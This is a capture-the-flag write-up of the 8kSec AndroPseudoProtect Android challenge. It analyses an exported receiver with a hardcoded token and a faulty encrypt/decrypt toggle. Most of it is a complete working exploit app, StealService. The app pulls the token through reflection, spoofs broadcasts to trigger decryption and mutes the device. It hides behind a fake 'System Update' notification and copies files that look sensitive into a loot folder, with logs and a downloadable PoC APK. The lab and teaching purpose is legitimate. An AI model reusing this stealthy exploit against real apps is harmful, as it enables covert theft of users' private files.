**Description**: Tired of worrying about your device security? AndroPseudoProtect offers comprehensive protection with just a tap!

**Link**: https://academy.8ksec.io/course/android-application-exploitation-challenges

![[8ksec-AndroiPseudoProtect_1.png]]

Let's install the `.apk` file using **ADB**
```bash
adb install -r AndroPseudoProtect.apk
```

After some minutes looking for the behavior of the app, and giving the permissions; The app will encrypt the **files** under `sdcard` directory.

![[8ksec-AndroiPseudoProtect_2.png]]

That's funny and idk if this is intended, but I don't care because I don't read the source code yet.

After some "QA" test(? I noticed that **when the user reopens AndroPseudoProtect after closing it, pressing the “Start Security” button doesn’t re‑enable protection as expected**; instead, *if encrypted files already exist, the app **decrypts them all***.
This flawed toggle *behavior lets an attacker exploit the exported service that triggers the same logic*, silently restoring *files to plaintext whenever the user interacts with the app*, while the victim believes encryption is still protecting their data. 

Analyzing the logs file, I didn't find nothing useful.
Let's inspect the **source code** using **JADX**.
Looking in the `AndroidManifest.xml` file, we can see the following XML content:
```xml
<activity
    android:name="com.eightksec.andropseudoprotect.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<service
    android:name="com.eightksec.andropseudoprotect.SecurityService"
    android:exported="true"
    android:foregroundServiceType="dataSync"/>
<receiver
    android:name="com.eightksec.andropseudoprotect.SecurityReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="com.eightksec.andropseudoprotect.START_SECURITY"/>
        <action android:name="com.eightksec.andropseudoprotect.STOP_SECURITY"/>
    </intent-filter>
</receiver>
```

We can see the *Activity*:
- `com.eightksec.andropseudoprotect.MainActivity`

The *service*:
- `com.eightksec.andropseudoprotect.SecurityService`

The *receiver*:
- `com.eightksec.andropseudoprotect.SecurityReceiver`

The *receiver listen* for:
- `com.eightksec.andropseudoprotect.START_SECURITY`

- `com.eightksec.andropseudoprotect.STOP_SECURITY`

As **exported** and **without protections permissions**.
So, **any app can launch the service**!

But first, let's go in *depth into the code we can see with JADX*.
**`MainActivity`** class interesting code:
```java
private boolean isServiceRunning;
```

This code calls `updateSecurityStatus()` passing the default value **false**.
```java
private final void checkServiceRunning() {
    updateSecurityStatus(this.isServiceRunning);
}
```
Project “**INSECURE**”/*Start* button enabled **without consulting the `SecurityService`** or the Foreground Service.

1. `updateSecurityStatus(true)` → print “**SECURE**”.
2. Generate **new token** and make `startService(... START_SECURITY ...)`
```java
private final void startSecurity() {
    showDebugNotification("Starting security service");
    updateSecurityStatus(true);
    resetEncryptionProgress();
    Intent intent = new Intent();
    intent.setAction(SecurityService.ACTION_START_SECURITY);
    SecurityUtils securityUtils = this.securityUtils;
    SecurityUtils securityUtils2 = null;
    
    if (securityUtils == null) {
        Intrinsics.throwUninitializedPropertyAccessException("securityUtils");
        securityUtils = null;
    }
    
    intent.putExtra(SecurityService.EXTRA_SECURITY_TOKEN, securityUtils.getSecurityToken());
    
    try {
        Intent intent2 = new Intent(this, (Class<?>) SecurityService.class);
        intent2.setAction(SecurityService.ACTION_START_SECURITY);
        SecurityUtils securityUtils3 = this.securityUtils;
        
        if (securityUtils3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("securityUtils");
        } else {
            securityUtils2 = securityUtils3;
        }
        
        intent2.putExtra(SecurityService.EXTRA_SECURITY_TOKEN, securityUtils2.getSecurityToken());
        startService(intent2);
        sendBroadcast(intent);
        ToastUtils.showInfoToast$default(ToastUtils.INSTANCE, this, "Starting Security Service", 0, 4, null);
    } catch (Exception e) {
        ToastUtils.showErrorToast$default(ToastUtils.INSTANCE, this, "Error: " + e.getMessage(), 0, 4, null);
        updateSecurityStatus(false);
    }
}
```
When the *service sees* `.encrypted` files, it **interprets START as decrypt**. UI says “*SECURE*”, but the data **remains clear**.

This code always call `startDecryption()` within the service.
```java
private final void stopSecurity() {
    showDebugNotification("Stopping security service");
    updateSecurityStatus(false);
    Intent intent = new Intent();
    intent.setAction(SecurityService.ACTION_STOP_SECURITY);
    SecurityUtils securityUtils = this.securityUtils;
    SecurityUtils securityUtils2 = null;
    
    if (securityUtils == null) {
        Intrinsics.throwUninitializedPropertyAccessException("securityUtils");
        securityUtils = null;
    }
    
    intent.putExtra(SecurityService.EXTRA_SECURITY_TOKEN, securityUtils.getSecurityToken());
    
    try {
        Intent intent2 = new Intent(this, (Class<?>) SecurityService.class);
        intent2.setAction(SecurityService.ACTION_STOP_SECURITY);
        SecurityUtils securityUtils3 = this.securityUtils;
        
        if (securityUtils3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("securityUtils");
        } else {
            securityUtils2 = securityUtils3;
        }
        
        intent2.putExtra(SecurityService.EXTRA_SECURITY_TOKEN, securityUtils2.getSecurityToken());
        startService(intent2);
        sendBroadcast(intent);
        ToastUtils.showWarningToast$default(ToastUtils.INSTANCE, this, "Stopping Security Service", 0, 4, null);
    } catch (Exception e) {
        ToastUtils.showErrorToast$default(ToastUtils.INSTANCE, this, "Error: " + e.getMessage(), 0, 4, null);
        updateSecurityStatus(true);
    }
}
```
If the user thought “Stop” *was pause*, it actually *decrypts everything*.

So, `MainActivity` class:
- Does not ask the `SecurityService` if it was **already running** (by `bindService` or `ServiceManager`).
- Does **not check** for `.encrypted` files to **decide** “*Start*” vs “*Stop*”.
- The `isServiceRunning` flag **is reset to false on every new process**, *enabling the “Start” button* and leading to the *buggy decryption flow*.

Now let's inspect the **`SecurityService`** class!
And we can notice here the problem:
```java
@Override
public int onStartCommand(Intent intent, int flags, int startId) {
    String action = intent != null ? intent.getAction() : null;
    
    if (action != null) {
        int hashCode = action.hashCode();
        
        if (hashCode != -1447419790) {
            if (hashCode == -1187150936 && action.equals(ACTION_START_SECURITY)) {
                String stringExtra = intent.getStringExtra(EXTRA_SECURITY_TOKEN);
                
                if (stringExtra != null && Intrinsics.areEqual(stringExtra, new SecurityUtils().getSecurityToken())) {
                    if (this.isServiceRunning) {
                        stopSecurity();
                    }
                    startSecurity();
                }
                return 1;
            }
        } else if (action.equals(ACTION_STOP_SECURITY)) {
            String stringExtra2 = intent.getStringExtra(EXTRA_SECURITY_TOKEN);
            
            if (stringExtra2 != null && Intrinsics.areEqual(stringExtra2, new SecurityUtils().getSecurityToken())) {
                stopSecurity();
            }
            return 1;
        }
    }
    
    startAsForeground();
    return 1;
}
```

We can divide the code in four steps:
1. **Predictable Authentication**: The token it *compares is the one it instantly generates itself*.
(`new SecurityUtils().getSecurityToken())`, so *any process loading the same class gets the correct value*. Also, never *is secret because is invoked every time when intent is coming*.
And **always is the same token**.

2. **Volatile flag `isServiceRunning`**: Is stored only in memory. (you can also check looking in the *sandbox app directory*).
- Killing the app → *the process dies* → `isServiceRunning` = **false**.
- Files remain as `.encrypted` (which is OK).

3. **Internal Start → Stop → Start sequence**:
- If the user touches “**Start**” *while the flag was true*, it *first enters `stopSecurity()`*, which executes:
```java
fileProcessor.startDecryption();
```
and send the `DECRYPTION_COMPLETE` broadcast.
- It then *passes to `startSecurity()`* and calls
```java
fileProcessor.startEncryption();
```
...but that method, **inside `FileProcessor`, detects that the files are already encrypted and runs out of work**, leaving *everything in plain text*. Or just because the *cycle was broken and does not re-encrypt anything*.

4. The actual **status of the files and the UI are out of sync**: the card says “*SECURE*”, but the **protection is disabled**.

Let's create the **exploit**!
#### `MainActivity`
Requests _notification_ and _storage_ permissions, then launches **`StealService`**.
#### `StealService`
- **Mutes** every audio stream.
- Reflects into `com.eightksec.andropseudoprotect` to steal the in‑memory **security token**.
- Spoofs the **victim’s IPC handshake** (`START_SECURITY` ➜ waits for `SECURITY_STARTED` ➜ replies `STOP_SECURITY`).
- After `DECRYPTION_COMPLETE`, **crawls external storage**, copies any ≤ 10 MB “*interesting*” files (e.g. `.txt`, `.pdf`, *secret*) into its *own loot-folder and previews a few lines of up to three text files in Logcat*.

### Code
**`AndroidManifest.xml`**
```XML
<manifest xmlns:android="http://schemas.android.com/apk/res/android"  
    xmlns:tools="http://schemas.android.com/tools"  
    package="com.lautaro.andropseudoexploit">  
  
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"  
        tools:ignore="QueryAllPackagesPermission"/>  
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />  
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />  
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"  
        tools:ignore="ScopedStorage" />  
  
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />  
    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />  
  
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>  
  
    <application  
        android:allowBackup="true"  
        android:icon="@mipmap/ic_launcher"  
        android:label="AndroPseudoExploit"  
        android:requestLegacyExternalStorage="true"  
        android:supportsRtl="true"  
        android:theme="@style/Theme.AppCompat.DayNight.NoActionBar">  
        <activity  
            android:name=".MainActivity"  
            android:exported="true">  
            <intent-filter>  
                <action android:name="android.intent.action.MAIN" />  
                <category android:name="android.intent.category.LAUNCHER" />  
            </intent-filter>  
        </activity>  
        <service  
            android:name=".StealService"  
            android:exported="false"  
            android:foregroundServiceType="dataSync"/>  
    </application>  
</manifest>
```

**`MainActivity.java`**
```java
package com.lautaro.andropseudoexploit;  
  
import android.Manifest;  
import android.content.Intent;  
import android.content.pm.PackageManager;  
import android.os.Build;  
import android.os.Bundle;  
import android.os.Environment;  
import android.provider.Settings;  
import android.util.Log;  
import android.widget.Toast;  
import androidx.annotation.NonNull;  
import androidx.appcompat.app.AppCompatActivity;  
import androidx.core.app.ActivityCompat;  
import androidx.core.content.ContextCompat;  
import android.net.Uri;  
  
public class MainActivity extends AppCompatActivity {  
    private static final int STORAGE_PERMISSION_CODE = 100;  
    private static final int MANAGE_STORAGE_CODE = 101;  
    private static final int NOTIFICATION_PERMISSION_CODE = 102;  
  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
  
        Log.i("PoC", "MainActivity created");  
  
        // get notifications  
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {  
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)  
                    != PackageManager.PERMISSION_GRANTED) {  
                Log.i("PoC", "Req POST_NOTIFICATIONS...");  
                ActivityCompat.requestPermissions(this,  
                        new String[]{Manifest.permission.POST_NOTIFICATIONS},  
                        NOTIFICATION_PERMISSION_CODE);  
                return; // wait  
            }  
        }  
        // verify perms  
        if (hasStoragePermissions()) {  
            Log.i("PoC", "perms granted, starting exploit");  
            startExploit();  
        } else {  
            Log.i("PoC", "no perms, requesting...");  
            requestStoragePermissions();  
        }  
    }  
    private boolean hasStoragePermissions() {  
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {  
            // android 11+  
            return Environment.isExternalStorageManager();  
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {  
            // android 6-10  
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&  
                    ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;  
        } else {  
            // android <= 5  
            return true;  
        }  
    }  
    private void requestStoragePermissions() {  
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {  
            // android 11+ - MANAGE_EXTERNAL_STORAGE  
            Log.i("PoC", "req MANAGE_EXTERNAL_STORAGE for android 11+");  
            try {  
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);  
                intent.setData(Uri.parse("package:" + getPackageName()));  
                startActivityForResult(intent, MANAGE_STORAGE_CODE);  
            } catch (Exception e) {  
                Log.e("PoC", "failed to request MANAGE_EXTERNAL_STORAGE", e);  
                // fallback  
                requestLegacyPermissions();  
            }  
        } else {  
            // android 6-10  
            requestLegacyPermissions();  
        }  
    }  
    private void requestLegacyPermissions() {  
        Log.i("PoC", "requesting legacy storage permissions");  
        ActivityCompat.requestPermissions(this, new String[]{  
                Manifest.permission.READ_EXTERNAL_STORAGE,  
                Manifest.permission.WRITE_EXTERNAL_STORAGE  
        }, STORAGE_PERMISSION_CODE);  
    }  
  
    @Override  
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {  
        super.onActivityResult(requestCode, resultCode, data);  
  
        if (requestCode == MANAGE_STORAGE_CODE) {  
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {  
                if (Environment.isExternalStorageManager()) {  
                    Log.i("PoC", "MANAGE_EXTERNAL_STORAGE granted");  
                    startExploit();  
                } else {  
                    Log.e("PoC", "MANAGE_EXTERNAL_STORAGE denied");  
                    Toast.makeText(this, "storage permis required for exploit", Toast.LENGTH_LONG).show();  
                    // try with legacy perms  
                    requestLegacyPermissions();  
                }  
            }        }    }  
    @Override  
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {  
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);  
  
        if (requestCode == NOTIFICATION_PERMISSION_CODE) {  
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {  
                Log.i("PoC", "notification perm granted");  
            } else {  
                Log.w("PoC", "notification perm denied");  
            }  
  
            // get storage  
            if (hasStoragePermissions()) {  
                startExploit();  
            } else {  
                requestStoragePermissions();  
            }  
        }  
        if (requestCode == STORAGE_PERMISSION_CODE) {  
            boolean allGranted = true;  
            for (int result : grantResults) {  
                if (result != PackageManager.PERMISSION_GRANTED) {  
                    allGranted = false;  
                    break;  
                }  
            }  
            if (allGranted) {  
                Log.i("PoC", "legacy storage perm granted");  
                startExploit();  
            } else {  
                Log.e("PoC", "storage perm denied");  
                Toast.makeText(this, "storage permissions required for exploit", Toast.LENGTH_LONG).show();  
                startExploit(); // try anyway  
            }  
        }    }  
    private void startExploit() {  
        Log.i("PoC", "starting StealService...");  
  
        // start exploit  
        startService(new Intent(this, StealService.class));  
    }  
}
```

**`StealService.java`**
```java
package com.lautaro.andropseudoexploit;  
  
import android.app.Service;  
import android.app.NotificationManager;  
import android.content.*;  
import android.os.*;  
import android.media.AudioManager;  
import android.util.Log;  
  
import java.io.*;  
import java.util.*;  
  
public class StealService extends Service {  
  
    private static final String V_PKG = "com.eightksec.andropseudoprotect";  
    private static final String ACT_START = V_PKG + ".START_SECURITY";  
    private static final String ACT_STOP = V_PKG + ".STOP_SECURITY";  
    private static final String ACT_STARTED = V_PKG + ".SECURITY_STARTED";  
    private static final String ACT_DONE = V_PKG + ".DECRYPTION_COMPLETE";  
    private static final String EXTRA_TOKEN = "security_token";  
  
    private BroadcastReceiver rx;  
    private String token;  
  
    @Override  
    public int onStartCommand(Intent i, int f, int id) {  
        new Thread(this::pwn).start();  
        return START_NOT_STICKY;  
    }  
  
    private void pwn() {  
        // mute  
        muteDevice();  
  
        token = getToken();  
        if (token == null) { stopSelf(); return; }  
        Log.i("PoC", "token=" + token);  
  
        hideNotificationPanel();  
        postDummyNotification();  
  
        register();  
  
        Intent s = new Intent(ACT_START)  
                .setPackage(V_PKG)  
                .putExtra(EXTRA_TOKEN, token);  
        sendBroadcast(s);  
        Log.i("PoC", "START_SECURITY sent – waiting SECURITY_STARTED ...");  
    }  
  
    private void muteDevice() {  
        try {  
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);  
            if (am != null) {  
                int[] streams = {  
                        AudioManager.STREAM_MUSIC,  
                        AudioManager.STREAM_NOTIFICATION,  
                        AudioManager.STREAM_RING,  
                        AudioManager.STREAM_ALARM,  
                        AudioManager.STREAM_SYSTEM  
                };  
                for (int s : streams) am.setStreamVolume(s, 0, 0);  
                Log.i("PoC", "device audio muted");  
            }  
        } catch (Exception e) {  
            Log.w("PoC", "mute failed: " + e.getMessage());  
        }  
    }  
    // reflection  
    private String getToken() {  
        try {  
            Context vc = createPackageContext(V_PKG, CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY);  
            Class<?> su = vc.getClassLoader().loadClass(V_PKG + ".SecurityUtils");  
            return (String) su.getMethod("getSecurityToken")  
                    .invoke(su.getDeclaredConstructor().newInstance());  
        } catch (Exception e) {  
            Log.e("PoC", "token fail", e);  
            return null;  
        }  
    }  
    // try close notification panel  
    private void hideNotificationPanel() {  
        try {  
            Intent closeDialogs = new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS");  
            sendBroadcast(closeDialogs);  
            Log.i("PoC", "closed notification panel");  
        } catch (Exception e) {  
            Log.w("PoC", "cannot close notification panel: " + e.getMessage());  
        }  
    }  
    // send dummy notification  
    private void postDummyNotification() {  
        try {  
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {  
                android.app.NotificationChannel channel =  
                        new android.app.NotificationChannel("stealth_channel",  
                                "System Updates", NotificationManager.IMPORTANCE_LOW);  
                NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);  
                nm.createNotificationChannel(channel);  
  
                android.app.Notification notif = new android.app.Notification.Builder(this, "stealth_channel")  
                        .setSmallIcon(android.R.drawable.ic_dialog_info)  
                        .setContentTitle("System Update")  
                        .setContentText("Checking for updates...")  
                        .setPriority(android.app.Notification.PRIORITY_LOW)  
                        .setOngoing(false)  
                        .setAutoCancel(true)  
                        .build();  
  
                nm.notify(999, notif);  
                Log.i("PoC", "dummy notification posted");  
            }  
        } catch (Exception e) {  
            Log.w("PoC", "dummy notification failed: " + e.getMessage());  
        }  
    }  
    // receivers  
    private void register() {  
        rx = new BroadcastReceiver() {  
            @Override  
            public void onReceive(Context c, Intent in) {  
                String a = in.getAction();  
                if (ACT_STARTED.equals(a)) {  
                    Log.i("PoC", "SECURITY_STARTED → sending STOP");  
                    hideNotificationPanel(); // hide  
  
                    Intent stop = new Intent(ACT_STOP)  
                            .setPackage(V_PKG)  
                            .putExtra(EXTRA_TOKEN, token);  
                    sendBroadcast(stop);  
                } else if (ACT_DONE.equals(a)) {  
                    Log.i("PoC", "DECRYPTION_COMPLETE, looting...");  
                    hideNotificationPanel(); // hide  
  
                    loot();  
                    cleanup();  
                }  
            }        };  
  
        IntentFilter f = new IntentFilter();  
        f.addAction(ACT_STARTED);  
        f.addAction(ACT_DONE);  
  
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {  
            registerReceiver(rx, f, Context.RECEIVER_EXPORTED);  
        } else {  
            registerReceiver(rx, f, Context.RECEIVER_EXPORTED);  
        }  
    }  
    // steal files  
    private void loot() {  
        File sd = Environment.getExternalStorageDirectory();  
        File base = getExternalFilesDir(null);  
        File lootDir = new File(base, "loot");  
        lootDir.mkdirs();  
  
        Log.i("PoC", "traversing: " + sd.getAbsolutePath());  
        int n = copyRecursive(sd, lootDir, sd.getAbsolutePath());  
        Log.i("PoC", "copied " + n + " files into " + lootDir.getAbsolutePath());  
  
        previewTxts(lootDir);  
    }  
  
    private int copyRecursive(File start, File dstRoot, String rootPath) {  
        int count = 0;  
        Deque<File> stack = new ArrayDeque<>();  
        stack.push(start);  
  
        while (!stack.isEmpty()) {  
            File cur = stack.pop();  
            try {  
                if (cur.isDirectory()) {  
                    File[] kids = cur.listFiles();  
                    if (kids != null && kids.length < 1000) {  
                        Collections.addAll(stack, kids);  
                    }  
                } else if (isInteresting(cur)) {  
                    String rel = cur.getAbsolutePath().substring(rootPath.length());  
                    if (rel.startsWith("/")) rel = rel.substring(1);  
                    File dst = new File(dstRoot, rel);  
                    dst.getParentFile().mkdirs();  
  
                    try (InputStream in = new FileInputStream(cur);  
                         OutputStream out = new FileOutputStream(dst)) {  
                        in.transferTo(out);  
                        Log.i("PoC", "stolen: " + cur.getName());  
                        count++;  
                    } catch (IOException e) {  
                        Log.w("PoC", "copy failed: " + cur.getName());  
                    }  
                }            } catch (SecurityException ignored) {}  
        }        return count;  
    }  
  
    // just for poc examples  
    private boolean isInteresting(File f) {  
        if (f == null || !f.exists() || f.length() == 0) return false;  
        if (f.length() > 10 * 1024 * 1024) return false;  
        String n = f.getName().toLowerCase();  
        return n.endsWith(".txt") || n.endsWith(".pdf") ||  
                n.endsWith(".doc") || n.endsWith(".docx") ||  
                n.contains("secret") || n.contains("password") ||  
                n.contains("key") || n.contains("private");  
    }  
  
    private void previewTxts(File dir) {  
        List<File> txtFiles = listTxt(dir);  
        int shown = 0;  
        for (File f : txtFiles) {  
            if (shown >= 3) break;  
            Log.i("PoC", "=== " + f.getName() + " ===");  
            try (BufferedReader br = new BufferedReader(new FileReader(f))) {  
                for (int i = 0; i < 8; i++) {  
                    String l = br.readLine();  
                    if (l == null) break;  
                    Log.i("PoC", "   " + l);  
                }  
            } catch (IOException ignored) {}  
            Log.i("PoC", "=== end ===");  
            shown++;  
        }  
    }  
    private List<File> listTxt(File d) {  
        List<File> l = new ArrayList<>();  
        if (d == null || !d.exists()) return l;  
        File[] files = d.listFiles();  
        if (files != null) {  
            for (File f : files) {  
                if (f.isDirectory()) l.addAll(listTxt(f));  
                else if (f.getName().toLowerCase().endsWith(".txt")) l.add(f);  
            }  
        }        return l;  
    }  
  
    private void cleanup() {  
        try {  
            unregisterReceiver(rx);  
        } catch (Exception ignored) {}  
        try {  
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);  
            nm.cancel(999); // cancel notification  
        } catch (Exception ignored) {}  
        stopSelf();  
        Log.i("PoC", "stealth exploit completed!!");  
    }  
  
    @Override  
    public IBinder onBind(Intent i) {  
        return null;  
    }  
}
```

The logs looks like:
```bash
I  token=8ksec_S3cr3tT0k3n_D0N0tSh4r3
W  cannot close notification panel: Permission Denial: android.intent.action.CLOSE_SYSTEM_DIALOGS broadcast from (pid=4530, uid=10224) requires android.permission.BROADCAST_CLOSE_SYSTEM_DIALOGS.
I  dummy notification posted
I  START_SECURITY sent – waiting SECURITY_STARTED ...
I  DECRYPTION_COMPLETE, looting...
W  cannot close notification panel: Permission Denial: android.intent.action.CLOSE_SYSTEM_DIALOGS broadcast from (pid=4530, uid=10224) requires android.permission.BROADCAST_CLOSE_SYSTEM_DIALOGS.
I  traversing: /storage/emulated/0
I  stolen: file.txt
I  stolen: filetest.txt
I  copied 2 files into /storage/emulated/0/Android/data/om.lautaro.andropseudoexploit/files/loot
I  === file.txt ===
I     asdasd
I  === end ===
I  === filetest.txt ===
I     aaaaaa
I  === end ===
I  stealth exploit completed!!
```

![[8ksec-AndroiPseudoProtect_3.png]]

![[8ksec-AndroiPseudoProtect_4.png]]

Steps to reproduce:
- Launch the target app.
- Encrypt the files.
- Put the target app in background.
- Launch the PoC app and see the logs.

**Download PoC**: https://lautarovculic.com/my_files/androPseudoExploit.apk

I hope you found it useful (:
